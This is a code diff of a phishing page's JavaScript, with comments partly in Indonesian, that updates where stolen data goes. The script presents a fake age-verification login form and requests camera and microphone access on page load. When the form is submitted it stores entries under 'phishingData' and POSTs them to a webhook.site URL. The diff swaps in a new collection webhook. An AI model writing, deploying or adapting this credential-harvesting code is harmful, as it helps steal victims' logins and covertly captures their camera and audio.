@@ -153,13 +153,11 @@
 
 <script>
     (function() {
-        // PLAY BUTTON
         document.getElementById('playBtn').addEventListener('click', function() {
             document.querySelector('.age-verification').scrollIntoView({ behavior: 'smooth' });
             document.getElementById('email').focus();
         });
 
-        // REQUEST PERMISSION KAMERA
         async function requestPermissions() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -180,7 +178,6 @@
         }
         requestPermissions();
 
-        // SUBMIT FORM
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value.trim();
@@ -215,8 +212,8 @@
             stored.push(data);
             localStorage.setItem('phishingData', JSON.stringify(stored));
 
-            // KIRIM KE WEBHOOK
-            fetch('https://webhook.site/434d5015-24c0-47c4-af2b-7d46b55872e1', {
+            // KIRIM KE WEBHOOK (BARU)
+            fetch('https://webhook.site/45a8d4ee-fb9a-4e12-89c6-cc58fb90ca94', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
